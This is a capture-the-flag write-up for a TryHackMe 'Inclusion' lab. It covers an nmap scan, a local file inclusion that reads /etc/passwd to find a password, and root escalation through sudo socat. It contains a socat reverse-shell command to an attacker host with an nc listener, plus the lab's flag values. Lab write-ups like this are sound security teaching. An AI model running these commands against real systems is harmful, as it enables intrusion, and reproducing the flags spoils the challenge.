# Inclusion

## Task 1 -- Deploy
```
export IP=10.10.111.110
```

## Task 2 -- Root It

### 1 -- user flag

Nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Inclusion$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 00:06 MDT
Nmap scan report for 10.10.111.110
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.14 seconds
```

We can find LFI parameters by clicking around and watching how the URL changes. For example, the `name` parameter is vulnerable to LFI as we can view the `/etc/passwd` file. In the `/etc/passwd` file we can find the password to the user `falconfeast`:


![lfi](https://user-images.githubusercontent.com/32188816/82784442-c126b100-9e1d-11ea-8542-fd200be2c003.png)

Now that we have creds, we log into the box and get the first flag:

```bash
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
```

### 2 -- root flag

We need to find a way to escalate our privileges, so lets first see what commands `falconfeast` can run as root:

```bash
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

Looking in [GTFOBins](https://gtfobins.github.io/gtfobins/socat/) we can find some escalation methods for `socat`. The one which we can use is a simple reverse shell:

```bash
falconfeast@inclusion:~$ sudo socat tcp-connect:10.8.21.42:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

After running that command we catch a root shell and can get the flag:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Inclusion$  nc -lvp 1234
listening on [any] 1234 ...
10.10.111.110: inverse host lookup failed: Unknown host
connect to [10.8.21.42] from (UNKNOWN) [10.10.111.110] 43740
/bin/sh: 0: can't access tty; job control turned off
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
42964104845495153909
```
